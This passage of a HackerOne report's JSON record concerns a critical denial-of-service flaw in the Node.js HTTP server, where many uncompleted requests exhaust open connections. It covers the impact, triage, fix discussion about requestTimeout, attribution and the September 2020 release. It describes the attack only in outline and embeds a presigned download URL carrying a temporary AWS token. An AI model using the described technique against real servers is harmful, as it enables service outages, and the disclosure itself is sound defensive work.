id=\"acknowledgement\"\u003eAcknowledgement\u003c/h2\u003e\n\n\u003cp\u003eThis research was conducted and co-authored by me and [Matteo Collina](\u003ca title=\"matteo.collina@nearform.com\" href=\"mailto:matteo.collina@nearform.com\" rel=\"nofollow noopener noreferrer\"\u003ematteo.collina@nearform.com\u003c/a\u003e) and has been sponsored by \u003ca href=\"/redirect?url=https%3A%2F%2Fnearform.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eNearForm\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eIf an attacker execute a significative amount of requests on a target server without completing any, the server at some point will reach the allowed number of open connections and will not be able to serve any further request, resulting in a Denial of Service.\u003c/p\u003e\n","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-10-17T19:24:31.246Z","allow_singular_disclosure_after":-6262755.411781109,"singular_disclosure_allowed":true,"vote_count":1,"voters":["nessun00x"],"severity":{"rating":"critical","score":9.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":{"databaseId":666,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/nodejs/node","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7935700,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As this is my first report I mistakenly included a public PR without completely thinking about security impact for the time being. The PR has been live on GH for around 20 min but now it's completely gone.\n\nI'm correctly attaching the fix as patch here.\nSorry for the big inconvenience.","markdown_message":"\u003cp\u003eAs this is my first report I mistakenly included a public PR without completely thinking about security impact for the time being. The PR has been live on GH for around 20 min but now it\u0026#39;s completely gone.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m correctly attaching the fix as patch here.\u003cbr\u003e\nSorry for the big inconvenience.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-08T07:58:49.489Z","updated_at":"2020-05-08T07:58:49.489Z","actor":{"username":"shogunpanda","cleared":false,"url":"/shogunpanda","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sYGTTtbcoioPBBRUUH3s1cLY/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":820248,"filename":"requestTimeout.diff","type":"text/x-patch","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/o9XiWjn32XgD3MxPJuvS6syq?response-content-disposition=attachment%3B%20filename%3D%22requestTimeout.diff%22%3B%20filename%2A%3DUTF-8%27%27requestTimeout.diff\u0026response-content-type=text%2Fx-patch\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVHABZQ6K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070346Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDLEUqN2OLO3OoArpAduXGS%2FnWvclGJ7L%2FhS7ZlCNuSFwIhAKgaDWYosUsMZYxmwMD0tSfLg1FWhbQHhU86z2hns38zKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgwVVQvbJjCbXZyRbMQqkQM9XNobju5ij3mHEd1PgXrpuzeU%2BCZaLl8s8%2FXPts8hYLholdRFqlYhDzTmecfnLqTs%2FH8df0Fzv8NVTOhsz9Cu3LtPJmYcyMM6%2BCttQ0%2F5YV36HpOoKx7YBCXq6g1wpqiR5h0NB8nCyNbtahjtqqfKrkQsAJtF0n6vty0Dy5dIMaKZufttk1eoYubwLgfaN4YAthfVEyCI75XoSBcWtozJGhmqio20Kggp%2Ff9ESWUDjkkVQkVc66j8SevucVwBZgdZjxbmMc3p%2B%2FrtliE8Di2Ov48U%2Bmiyzxgy0RsqgwBWQeuC1Vvrs6a5UgzB5X13VoO7Zw2O5pS1EKsi0EwbwxD1t1gkpOGC1X37B6qMMiSraZswcogi35QEMA8XAQhIC2z%2Byugz3gdhCR4lBTeHgZARRoRQvNYoLHEkvjD4clJ4fdfbD%2FRcWQb953U%2BunjxQu2802uN7zsOYAZ%2F1SufQ8paJbIHLgiZu%2FJLfuV6RY9q9hQTpnm6QoNT4fkLlHao602RIKkBGhLK4iU4VXdLBpw5JDCJiav%2FBTrqAW2UJwXizthXBPPIZ57e77V%2B1Jr9Up7MhIMK722MpJQ5S6y2sEj0IRzF6bBvFIGcuc7s5TvUPI3RoSg3%2BoRepHEHQDZpJfcEB%2FPh8Jr6a8ILTQYD91llJENl%2B%2FADn1n%2B0ihsitf2dEU%2F8Jff%2FNN3i9J2juS2OvqLeEbMdBuCToL%2BbYC8hsevJk6YzpVS0q2WxfTPUq4t7RHDwzTYfPmQnso8MCFcSKpUgp39ZmtjV4S1TWj23dyd7WkHgRbrIsNiFZci3GJYaEnzJmzKDIghO7k6z8NutfGp8Ayl%2FCKxt1goZhsy13ssETolsg%3D%3D\u0026X-Amz-Signature=da787ec17d3985b878ce3d01d430ef9e338ba9ec25febf325582e652aaa5f975"}],"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7941704,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"@shogunpanda\n\nThanks for your submission. Unfortunately, this has already been submitted by another hacker. You effort is nonetheless appreciated and we hope to see more bugs from you in the future.\n\nBest Regards.","markdown_message":"\u003cp\u003e\u003ca href=\"/shogunpanda\"\u003e@shogunpanda\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThanks for your submission. Unfortunately, this has already been submitted by another hacker. You effort is nonetheless appreciated and we hope to see more bugs from you in the future.\u003c/p\u003e\n\n\u003cp\u003eBest Regards.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-08T19:52:53.215Z","updated_at":"2020-05-08T19:52:53.215Z","original_report_id":799072,"actor":{"username":"glassofbeer","cleared":false,"url":"/glassofbeer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/166/997/bf60ed9bb749786ae3f68f25703bf0528699cda7_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8003223,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-14T18:21:00.497Z","updated_at":"2020-05-14T18:21:00.497Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8472316,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-01T17:32:38.847Z","updated_at":"2020-07-01T17:32:38.847Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8829587,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I've invited @notwes. Wdyt think of this? The actual fix is going to be slightly different.\nWe are aiming to set the default requestTimeout to 0/disabled instead as there are too many legitimate cases for that.","markdown_message":"\u003cp\u003eI\u0026#39;ve invited \u003ca href=\"/notwes\"\u003e@notwes\u003c/a\u003e. Wdyt think of this? The actual fix is going to be slightly different.\u003cbr\u003e\nWe are aiming to set the default requestTimeout to 0/disabled instead as there are too many legitimate cases for that.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-02T16:56:43.126Z","updated_at":"2020-08-02T16:56:43.126Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8830442,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-02T22:51:13.157Z","updated_at":"2020-08-02T22:51:13.157Z","actor":{"username":"notwes","cleared":false,"url":"/notwes","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8830487,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"In general, I think this patch to node sounds like a good approach.  As with any change like this, it would break users if the timeout was anything other than 0 since folks will be relying on the long timeout, for example all large file upload scenarios.  Would be reasonable in the future to change it to something like 5 minutes by default on a major version.  Then folks could decide to increase it on services they expect to take this long.\n\nFWIW, I think that most attacks like this need to be solved in layers outside node in real world scenarios.  Having been the target of large DDOS attacks in the past, my anecdotal evidence is that solving these things at the application layer is just a bad idea, so having sane platform defaults and options seems like enough to me to say \"we are doing the right thing, if you need to you can turn it off\".","markdown_message":"\u003cp\u003eIn general, I think this patch to node sounds like a good approach.  As with any change like this, it would break users if the timeout was anything other than 0 since folks will be relying on the long timeout, for example all large file upload scenarios.  Would be reasonable in the future to change it to something like 5 minutes by default on a major version.  Then folks could decide to increase it on services they expect to take this long.\u003c/p\u003e\n\n\u003cp\u003eFWIW, I think that most attacks like this need to be solved in layers outside node in real world scenarios.  Having been the target of large DDOS attacks in the past, my anecdotal evidence is that solving these things at the application layer is just a bad idea, so having sane platform defaults and options seems like enough to me to say \u0026quot;we are doing the right thing, if you need to you can turn it off\u0026quot;.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-02T23:14:39.921Z","updated_at":"2020-08-02T23:14:39.921Z","actor":{"username":"notwes","cleared":false,"url":"/notwes","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9173438,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@shogunpanda  would you like attribution when this goes out in a security release and if so could you provide what you'd like in terms of\n\nThank you to X who works at Y for reporting this vulnerability.\n\n@mcollina would you like attribution when this goes out in a security release and if so could you provide what you'd like in terms of\n\nThank you to X who works at Y for reporting this vulnerability.\n","markdown_message":"\u003cp\u003e\u003ca href=\"/shogunpanda\"\u003e@shogunpanda\u003c/a\u003e  would you like attribution when this goes out in a security release and if so could you provide what you\u0026#39;d like in terms of\u003c/p\u003e\n\n\u003cp\u003eThank you to X who works at Y for reporting this vulnerability.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/mcollina\"\u003e@mcollina\u003c/a\u003e would you like attribution when this goes out in a security release and if so could you provide what you\u0026#39;d like in terms of\u003c/p\u003e\n\n\u003cp\u003eThank you to X who works at Y for reporting this vulnerability.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-09T18:13:17.514Z","updated_at":"2020-09-09T18:13:17.514Z","actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9173441,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"will need that by the end of the week to be able to include it.","markdown_message":"\u003cp\u003ewill need that by the end of the week to be able to include it.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-09T18:13:32.413Z","updated_at":"2020-09-09T18:13:32.413Z","actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9220205,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@shogunpanda , @mcollina one last ping.","markdown_message":"\u003cp\u003e\u003ca href=\"/shogunpanda\"\u003e@shogunpanda\u003c/a\u003e , \u003ca href=\"/mcollina\"\u003e@mcollina\u003c/a\u003e one last ping.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-14T19:43:35.435Z","updated_at":"2020-09-14T19:43:35.435Z","actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9220226,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Confirmed with Matteo through twitter:\n\nThank you to Paolo Insogna and Matteo Collina who work at Nearfom for reporting this vulnerability.\n \n","markdown_message":"\u003cp\u003eConfirmed with Matteo through twitter:\u003c/p\u003e\n\n\u003cp\u003eThank you to Paolo Insogna and Matteo Collina who work at Nearfom for reporting this vulnerability.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-14T19:48:19.829Z","updated_at":"2020-09-14T19:48:19.829Z","actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9220232,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Was suggested it should be: \n\nThank you to Paolo Insogna and Matteo Collina who work at Nearfom for reporting and fixing this vulnerability.","markdown_message":"\u003cp\u003eWas suggested it should be: \u003c/p\u003e\n\n\u003cp\u003eThank you to Paolo Insogna and Matteo Collina who work at Nearfom for reporting and fixing this vulnerability.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-14T19:49:05.171Z","updated_at":"2020-09-14T19:49:05.171Z","actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9250774,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Resolved in September security release: https://nodejs.org/en/blog/vulnerability/september-2020-security-releases/","markdown_message":"\u003cp\u003eResolved in September security release: \u003ca title=\"https://nodejs.org/en/blog/vulnerability/september-2020-security-releases/\" href=\"/redirect?url=https%3A%2F%2Fnodejs.org%2Fen%2Fblog%2Fvulnerability%2Fseptember-2020-security-releases%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://nodejs.org/en/blog/vulnerability/september-2020-security-releases/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-17T19:23:24.213Z","updated_at":"2020-09-17T19:23:24.213Z","actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9250783,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-17T19:24:24.389Z","updated_at":"2020-09-17T19:24:24.389Z","actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"shogunpanda","url":"/shogunpanda"},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9250784,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-17T19:24:31.190Z","updated_at":"2020-09-17T19:24:31.190Z","first_to_agree":true,"actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9552841,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-17T19:24:45.508Z","updated_at":"2020-10-17T19:24:45.508Z","actor":{"url":"/nodejs","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Node.js"}},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}